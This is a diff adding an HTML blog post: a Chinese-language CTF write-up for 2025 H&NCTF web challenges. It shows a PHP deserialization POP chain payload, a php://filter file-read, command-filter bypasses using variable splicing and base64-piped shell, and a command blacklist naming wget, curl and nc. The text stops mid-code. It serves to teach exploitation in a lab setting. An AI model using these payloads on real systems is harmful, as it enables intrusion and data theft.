@@ -1,0 +1,925 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="## ez_php  1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);class GOGOGO&#123;    public $dengchao;    function __destruct()&#123;        echo &quot;Go Go Go~ 出发喽！&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025H&amp;NCTF web">
+<meta property="og:url" content="https://xendr1a.github.io/2025/06/09/2025HampNCTF%20web/index.html">
+<meta property="og:site_name" content="Xendr1a">
+<meta property="og:description" content="## ez_php  1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);class GOGOGO&#123;    public $dengchao;    function __destruct()&#123;        echo &quot;Go Go Go~ 出发喽！&amp;qu">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-09T15:32:24.000Z">
+<meta property="article:modified_time" content="2025-09-02T13:31:37.000Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="比赛">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>2025H&amp;amp;NCTF web - Xendr1a</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025H&amp;amp;NCTF web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-09 23:32" pubdate>
+          2025年6月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          20k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          164 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025H&amp;amp;NCTF web</h1>
+            
+            
+              <div class="markdown-body">
+                
+                
+## ez_php
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GOGOGO</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dengchao</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;dengchao;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DouBao</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Dagongren</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Bagongren</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;Dagongren != <span class="hljs-variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;Bagongren)) )&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;dao, [<span class="hljs-string">&#x27;诗人我吃！&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeiCaFei</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$HongCaFei</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;HongCaFei, [<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$name</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;What do you want to do?&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+挺简单的链子，主要就是注意到 throw new Exception('What do you want to do?');，我们需要绕过这个GC回收，然后触发__destruct()方法让链子走下去。还有一个地方就是
+
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __toString()&#123;<br>        <span class="hljs-keyword">if</span>( ($<span class="hljs-keyword">this</span>-&gt;Dagongren != $<span class="hljs-keyword">this</span>-&gt;Bagongren) &amp;&amp; (md5($<span class="hljs-keyword">this</span>-&gt;Dagongren) === md5($<span class="hljs-keyword">this</span>-&gt;Bagongren)) &amp;&amp; (sha1($<span class="hljs-keyword">this</span>-&gt;Dagongren)=== sha1($<span class="hljs-keyword">this</span>-&gt;Bagongren)) )&#123;<br>            call_user_func_array($<span class="hljs-keyword">this</span>-&gt;dao, [<span class="hljs-string">&#x27;诗人我吃！&#x27;</span>]);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+我们直接用数组可以绕过，然后我们就可以开始写了
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GOGOGO</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dengchao</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;dengchao;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DouBao</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Dagongren</span>=[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Bagongren</span>=[<span class="hljs-number">2</span>];<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;Dagongren != <span class="hljs-variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;Bagongren)) )&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;dao, [<span class="hljs-string">&#x27;诗人我吃！&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeiCaFei</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$HongCaFei</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;HongCaFei, [<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$name</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GOGOGO</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">DouBao</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HeiCaFei</span>();<br><br><span class="hljs-variable">$a</span>-&gt;dengchao=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;dao=[<span class="hljs-variable">$c</span>,<span class="hljs-string">&quot;cat /ofl1111111111ove4g&quot;</span>];<br><span class="hljs-variable">$c</span>-&gt;HongCaFei=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-comment">#a:2:&#123;i:0;O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:23:&quot;cat /ofl1111111111ove4g&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;i:1;&#125;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;i:2;&#125;&#125;&#125;i:1;i:0;&#125;</span><br></code></pre></td></tr></table></figure>
+
+我们把结果最后面的i:1;i:0;改为i:0;i:0;
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;GOGOGO&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dengchao&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;DouBao&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;dao&quot;</span>;a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HeiCaFei&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;HongCaFei&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;cat /ofl1111111111ove4g&quot;</span>;&#125;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;Dagongren&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;Bagongren&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+## DeceptiFlag
+
+一开始看到这个题解那么少以为挺难的就没去看题目了，刚好停电就睡觉去了...填了xiyangyang和huitailang后没反应，那我们可以试试抓包，抓包可能会给你意想不到的的惊喜
+
+![](http://xendria.icu/wp-content/uploads/2025/06/b449b50b-29fd-49cf-94d5-1d05618a9b92.png)
+
+额，是填两个...然后呢我们得到了一个返回包，我们注意到这两个地方
+
+![](http://xendria.icu/wp-content/uploads/2025/06/ac5de0205ae3ef320d27e5e675356f0a-1024x355.png)
+
+当时比赛没看到tips.php直接全剧终了，我们进去
+
+![](http://xendria.icu/wp-content/uploads/2025/06/de3f86fc0b1327f17601061060f7990c.png)
+
+看到了file再结合给了flag的目录，我们可以试试伪协议读取?file=php://filter/convert.base64-encode/resource=/var/flag/flag.txt结果还真是这样子...
+
+## Really_Ez_Rce
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;Number&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$inputNumber</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;Number&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d/&#x27;</span>, <span class="hljs-variable">$inputNumber</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不行不行,不能这样&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$inputNumber</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>            <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<br>                <span class="hljs-string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,<br>                <span class="hljs-variable">$cmd</span><br>            )) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你传的参数似乎挺正经的,放你过去吧</span><br><span class="hljs-string">&quot;</span>;<br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono,hacker!!!&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+第一层Number直接用数组绕过了  Number[]=1第二层我们看到ban了很多的东西，但是仔细一看会发现=和;和`居然没ban，那我们可以拼接语句了，以及反引号绕过了
+
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mel">找目录<br>l<span class="hljs-string">``</span>s /<br>l$@s /<br>然后就是查看<br>echo Y2F0IC9mbGFn | base64 -d | sh <span class="hljs-comment">//用base编码绕过</span><br>cmd=a=ca;b=t;c=se;d=d;e=di;f=r;$a$b /$($e$f <span class="hljs-number">-1</span> / | $c$d -n <span class="hljs-number">5</span>p); <span class="hljs-comment">//查看第五个的内容就是</span><br>cat /$(dir <span class="hljs-number">-1</span> / | sed -n <span class="hljs-number">5</span>p)<span class="hljs-comment">//第一次见到这种姿势，学到学到了</span><br></code></pre></td></tr></table></figure>
+
+## 半成品login
+
+admin admin123弱密码爆破进入然后发现应该是有个sql注入select,空格等被过滤了
+
+![](http://xendria.icu/wp-content/uploads/2025/06/3a278bca-52dd-4118-a940-e8f05434f46f-1-1024x602.png)
+
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 